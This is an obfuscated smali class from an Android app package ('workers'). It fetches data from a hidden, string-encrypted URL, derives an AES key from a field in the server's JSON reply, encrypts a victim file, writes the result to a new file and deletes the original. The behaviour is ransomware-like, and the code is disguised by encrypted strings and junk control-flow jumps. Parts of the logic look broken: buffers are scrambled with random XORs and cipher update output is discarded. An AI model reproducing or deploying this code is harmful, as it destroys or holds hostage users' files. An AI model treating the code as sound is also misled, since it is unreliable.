.class public Lcom/example/myapplication/workers/g;
.super Ljava/lang/Object;
.source ""


# instance fields
.field private a:Landroid/content/Context;

.field private b:Ljava/security/MessageDigest;

.field private c:Ljava/lang/String;

.field private d:[B

.field private e:[B

.field private f:Ljavax/crypto/spec/SecretKeySpec;

.field private g:Ljavax/crypto/Cipher;

.field private h:Ljavax/crypto/spec/IvParameterSpec;

.field private i:Ljava/io/FileInputStream;

.field private j:Ljava/io/File;

.field private k:Ljava/io/File;

.field private l:Ljava/io/FileOutputStream;


# direct methods
.method static constructor <clinit>()V
	.locals 1

	return-void
.end method

.method public constructor <init>(Landroid/content/Context;Ljava/io/File;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lcom/example/myapplication/workers/g;->a:Landroid/content/Context;

    iput-object p2, p0, Lcom/example/myapplication/workers/g;->k:Ljava/io/File;

    return-void
.end method

.method private b([B)[B
    .locals 6

	const v0, 31
	const v1, 5
	add-int v0, v0, v1
	rem-int v0, v0, v1
	if-gtz v0, :HIMmSgzSjxtZjbsI
	goto/32 :mFpxoGfPQHevWPgz
	:HIMmSgzSjxtZjbsI
	:zXHcapsuLrFkBJmi

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    array-length v3, p1

    if-ge v2, v3, :cond_1

    array-length v3, p1

    invoke-virtual {v0, v3}, Ljava/util/Random;->nextInt(I)I

    move-result v3

    rem-int/lit8 v4, v3, 0x10

    if-nez v4, :cond_0

    invoke-direct {p0, p1, v2, v3}, Lcom/example/myapplication/workers/g;->d([BII)[B

    :cond_0
    const/4 v4, 0x2

    new-array v4, v4, [Ljava/lang/Object;

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    aput-object v5, v4, v1

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v5, 0x1

    aput-object v3, v4, v5

	const-string/jumbo v3, "8f13adf0d2eea0322687387803163164"

	invoke-static {v3}, Lcom/decryptstringmanager/DecryptString;->decryptString(Ljava/lang/String;)Ljava/lang/String;

	move-result-object v3

    invoke-static {v3, v4}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

	const-string/jumbo v4, "ee21048f44cab932fa4a7aa3be6ed1bc"

	invoke-static {v4}, Lcom/decryptstringmanager/DecryptString;->decryptString(Ljava/lang/String;)Ljava/lang/String;

	move-result-object v4

    invoke-static {v4, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    return-object p1
	:mFpxoGfPQHevWPgz
	goto/32 :zXHcapsuLrFkBJmi
.end method

.method private d([BII)[B
    .locals 1

    aget-byte v0, p1, p2

    aget-byte p3, p1, p3

    xor-int/2addr p3, v0

    int-to-byte p3, p3

    aput-byte p3, p1, p2

    return-object p1
.end method


# virtual methods
.method public synthetic a(Lorg/json/JSONObject;)V
    .locals 4

	const v0, 21
	const v1, 15
	add-int v0, v0, v1
	rem-int v0, v0, v1
	if-gtz v0, :OnTyXSsWJQlIyUvz
	goto/32 :dHOTwCSfEbfvtSzZ
	:OnTyXSsWJQlIyUvz
	:fRbLAhUBUiEJjVTF

	const-string/jumbo v0, "ee21048f44cab932fa4a7aa3be6ed1bc"

	invoke-static {v0}, Lcom/decryptstringmanager/DecryptString;->decryptString(Ljava/lang/String;)Ljava/lang/String;

	move-result-object v0

    :try_start_0
	const-string/jumbo v1, "b720a47719b42d5bcfe4b091004220e4"

	invoke-static {v1}, Lcom/decryptstringmanager/DecryptString;->decryptString(Ljava/lang/String;)Ljava/lang/String;

	move-result-object v1

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

	const-string/jumbo v1, "05db5f0efb95a0e9b6902e8e475eb651"

	invoke-static {v1}, Lcom/decryptstringmanager/DecryptString;->decryptString(Ljava/lang/String;)Ljava/lang/String;

	move-result-object v1

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/example/myapplication/workers/g;->c:Ljava/lang/String;

	const-string/jumbo p1, "b010b38b3c08f3ea2edaa6dbb162b4d2"

	invoke-static {p1}, Lcom/decryptstringmanager/DecryptString;->decryptString(Ljava/lang/String;)Ljava/lang/String;

	move-result-object p1

    invoke-static {p1}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;

    move-result-object p1

    iput-object p1, p0, Lcom/example/myapplication/workers/g;->b:Ljava/security/MessageDigest;

    iget-object v1, p0, Lcom/example/myapplication/workers/g;->c:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/security/MessageDigest;->digest([B)[B

    move-result-object p1

    iput-object p1, p0, Lcom/example/myapplication/workers/g;->d:[B

    new-instance p1, Ljavax/crypto/spec/SecretKeySpec;

    iget-object v1, p0, Lcom/example/myapplication/workers/g;->d:[B

	const-string/jumbo v2, "382aae7ceaf6f1ceae6ebe65011eb85e"

	invoke-static {v2}, Lcom/decryptstringmanager/DecryptString;->decryptString(Ljava/lang/String;)Ljava/lang/String;

	move-result-object v2

    invoke-direct {p1, v1, v2}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    iput-object p1, p0, Lcom/example/myapplication/workers/g;->f:Ljavax/crypto/spec/SecretKeySpec;

    const/16 p1, 0x10

    new-array p1, p1, [B

    iput-object p1, p0, Lcom/example/myapplication/workers/g;->e:[B

    new-instance p1, Ljava/security/SecureRandom;

    invoke-direct {p1}, Ljava/security/SecureRandom;-><init>()V

    iget-object v1, p0, Lcom/example/myapplication/workers/g;->e:[B

    invoke-virtual {p1, v1}, Ljava/security/SecureRandom;->nextBytes([B)V

	const-string/jumbo p1, "b777781a138c7e581204d91f5b81463fb9ff0873c81eaa05ecf8bbc045813137"

	invoke-static {p1}, Lcom/decryptstringmanager/DecryptString;->decryptString(Ljava/lang/String;)Ljava/lang/String;

	move-result-object p1

    invoke-static {p1}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object p1

    iput-object p1, p0, Lcom/example/myapplication/workers/g;->g:Ljavax/crypto/Cipher;

    new-instance p1, Ljavax/crypto/spec/IvParameterSpec;

    iget-object v1, p0, Lcom/example/myapplication/workers/g;->e:[B

    invoke-direct {p1, v1}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V

    iput-object p1, p0, Lcom/example/myapplication/workers/g;->h:Ljavax/crypto/spec/IvParameterSpec;

    iget-object v1, p0, Lcom/example/myapplication/workers/g;->g:Ljavax/crypto/Cipher;

    const/4 v2, 0x1

    iget-object v3, p0, Lcom/example/myapplication/workers/g;->f:Ljavax/crypto/spec/SecretKeySpec;

    invoke-virtual {v1, v2, v3, p1}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V

    new-instance p1, Ljava/io/FileInputStream;

    iget-object v1, p0, Lcom/example/myapplication/workers/g;->k:Ljava/io/File;

    invoke-direct {p1, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    iput-object p1, p0, Lcom/example/myapplication/workers/g;->i:Ljava/io/FileInputStream;

    new-instance p1, Ljava/io/File;

    iget-object v1, p0, Lcom/example/myapplication/workers/g;->k:Ljava/io/File;

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

	const-string/jumbo v2, "ac3b2e388e8eb1e8f99eff65a635962b"

	invoke-static {v2}, Lcom/decryptstringmanager/DecryptString;->decryptString(Ljava/lang/String;)Ljava/lang/String;

	move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {p1, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    iput-object p1, p0, Lcom/example/myapplication/workers/g;->j:Ljava/io/File;

    new-instance p1, Ljava/io/FileOutputStream;

    iget-object v1, p0, Lcom/example/myapplication/workers/g;->j:Ljava/io/File;

    invoke-direct {p1, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    iput-object p1, p0, Lcom/example/myapplication/workers/g;->l:Ljava/io/FileOutputStream;

    const/high16 p1, 0x10000

    new-array p1, p1, [B

    :cond_0
    iget-object v1, p0, Lcom/example/myapplication/workers/g;->i:Ljava/io/FileInputStream;

    invoke-virtual {v1, p1}, Ljava/io/FileInputStream;->read([B)I

    move-result v1

    invoke-direct {p0, p1}, Lcom/example/myapplication/workers/g;->b([B)[B

    iget-object v2, p0, Lcom/example/myapplication/workers/g;->g:Ljavax/crypto/Cipher;

    invoke-virtual {v2, p1}, Ljavax/crypto/Cipher;->update([B)[B

    const/4 v2, -0x1

    if-ne v1, v2, :cond_0

    iget-object p1, p0, Lcom/example/myapplication/workers/g;->l:Ljava/io/FileOutputStream;

    iget-object v1, p0, Lcom/example/myapplication/workers/g;->g:Ljavax/crypto/Cipher;

    invoke-virtual {v1}, Ljavax/crypto/Cipher;->doFinal()[B

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/io/FileOutputStream;->write([B)V

    iget-object p1, p0, Lcom/example/myapplication/workers/g;->i:Ljava/io/FileInputStream;

    invoke-virtual {p1}, Ljava/io/FileInputStream;->close()V

    iget-object p1, p0, Lcom/example/myapplication/workers/g;->l:Ljava/io/FileOutputStream;

    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    iget-object p1, p0, Lcom/example/myapplication/workers/g;->k:Ljava/io/File;

    invoke-virtual {p1}, Ljava/io/File;->delete()Z

    iget-object p1, p0, Lcom/example/myapplication/workers/g;->e:[B

    invoke-static {p1}, Ljava/util/Arrays;->toString([B)Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_7
    .catch Ljava/security/NoSuchAlgorithmException; {:try_start_0 .. :try_end_0} :catch_6
    .catch Ljava/security/InvalidAlgorithmParameterException; {:try_start_0 .. :try_end_0} :catch_5
    .catch Ljava/security/InvalidKeyException; {:try_start_0 .. :try_end_0} :catch_4
    .catch Ljavax/crypto/NoSuchPaddingException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljavax/crypto/BadPaddingException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljavax/crypto/IllegalBlockSizeException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    goto :goto_0

    :catch_1
    move-exception p1

    goto :goto_0

    :catch_2
    move-exception p1

    goto :goto_0

    :catch_3
    move-exception p1

    goto :goto_0

    :catch_4
    move-exception p1

    goto :goto_0

    :catch_5
    move-exception p1

    goto :goto_0

    :catch_6
    move-exception p1

    goto :goto_0

    :catch_7
    move-exception p1

    :goto_0
	const-string/jumbo v1, "fba21e4265e79a10f3dec3440a465941"

	invoke-static {v1}, Lcom/decryptstringmanager/DecryptString;->decryptString(Ljava/lang/String;)Ljava/lang/String;

	move-result-object v1

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_1
    return-void
	:dHOTwCSfEbfvtSzZ
	goto/32 :fRbLAhUBUiEJjVTF
.end method

.method public c()V
    .locals 7

	const v0, 9
	const v1, 5
	add-int v0, v0, v1
	rem-int v0, v0, v1
	if-gtz v0, :AAtSzGcJRuABsfyV
	goto/32 :pJVgHodXLyQACgaY
	:AAtSzGcJRuABsfyV
	:hZbposAmBudDfODH

    new-instance v6, Lcom/example/myapplication/workers/j;

    new-instance v4, Lcom/example/myapplication/workers/c;

    invoke-direct {v4, p0}, Lcom/example/myapplication/workers/c;-><init>(Lcom/example/myapplication/workers/g;)V

    sget-object v5, Lcom/example/myapplication/workers/d;->a:Lcom/example/myapplication/workers/d;

    const/4 v1, 0x0

	const-string/jumbo v2, "cb810c0c5357293e43fefe388b99ea555f060d60343b22bcb92ac1077976bdb1"

	invoke-static {v2}, Lcom/decryptstringmanager/DecryptString;->decryptString(Ljava/lang/String;)Ljava/lang/String;

	move-result-object v2

    const/4 v3, 0x0

    move-object v0, v6

    invoke-direct/range {v0 .. v5}, Lcom/example/myapplication/workers/j;-><init>(ILjava/lang/String;Lorg/json/JSONObject;Lb/a/a/p$b;Lb/a/a/p$a;)V

    new-instance v0, Lcom/example/myapplication/workers/e;

    iget-object v1, p0, Lcom/example/myapplication/workers/g;->a:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/example/myapplication/workers/e;-><init>(Landroid/content/Context;)V

	const-string/jumbo v1, "cb810c0c5357293e43fefe388b99ea555f060d60343b22bcb92ac1077976bdb1"

	invoke-static {v1}, Lcom/decryptstringmanager/DecryptString;->decryptString(Ljava/lang/String;)Ljava/lang/String;

	move-result-object v1

    invoke-static {v1}, Ljava/net/URI;->create(Ljava/lang/String;)Ljava/net/URI;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/example/myapplication/workers/e;->get(Ljava/net/URI;)Ljava/util/List;

    move-result-object v0

    invoke-virtual {v6, v0}, Lcom/example/myapplication/workers/j;->N(Ljava/util/List;)V

    iget-object v0, p0, Lcom/example/myapplication/workers/g;->a:Landroid/content/Context;

    invoke-static {v0}, Lb/a/a/w/n;->a(Landroid/content/Context;)Lb/a/a/o;

    move-result-object v0

    invoke-virtual {v0, v6}, Lb/a/a/o;->a(Lb/a/a/n;)Lb/a/a/n;

    return-void
	:pJVgHodXLyQACgaY
	goto/32 :hZbposAmBudDfODH
.end method
